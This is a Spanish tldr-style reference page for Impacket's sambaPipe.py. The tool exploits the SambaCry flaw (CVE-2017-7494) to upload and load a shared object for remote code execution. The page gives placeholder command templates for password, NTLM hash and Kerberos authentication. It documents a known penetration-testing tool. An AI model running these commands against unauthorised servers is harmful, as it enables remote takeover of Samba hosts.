# sambaPipe.py

> Aprovecha la vulnerabilidad CVE-2017-7494 (SambaCry) para subir y cargar un archivo de objeto compartido (SO) en un servidor Samba vulnerable con el fin de ejecutar código de forma remota.
> Forma parte del paquete Impacket.
> Más información: <https://github.com/fortra/impacket>.

- Sube y carga un archivo de objeto compartido en un servidor Samba vulnerable:

`sambaPipe.py -so {{ruta/al/archivo.so}} {{dominio}}/{{nombre_de_usuario}}:{{contraseña}}@{{objetivo}}`

- Autentica utilizando hash NTLM en lugar de una contraseña:

`sambaPipe.py -so {{ruta/al/archivo.so}} -hashes {{LM_HASH:NT_HASH}} {{dominio}}/{{nombre_de_usuario}}:{{contraseña}}@{{objetivo}}`

- Utiliza la autenticación Kerberos para el destino:

`sambaPipe.py -so {{ruta/al/archivo.so}} -k -no-pass {{dominio}}/{{nombre_de_usuario}}:{{contraseña}}@{{destino}}`

- Especifica la IP de un controlador de dominio para la autenticación:

`sambaPipe.py -so {{ruta/al/archivo.so}} -dc-ip {{dc_ip}} {{dominio}}/{{nombre_de_usuario}}:{{contraseña}}@{{objetivo}}`

- Utiliza un puerto personalizado para la conexión SMB:

`sambaPipe.py -so {{ruta/al/archivo.so}} -port {{puerto}} {{dominio}}/{{nombre_de_usuario}}:{{contraseña}}@{{destino}}`
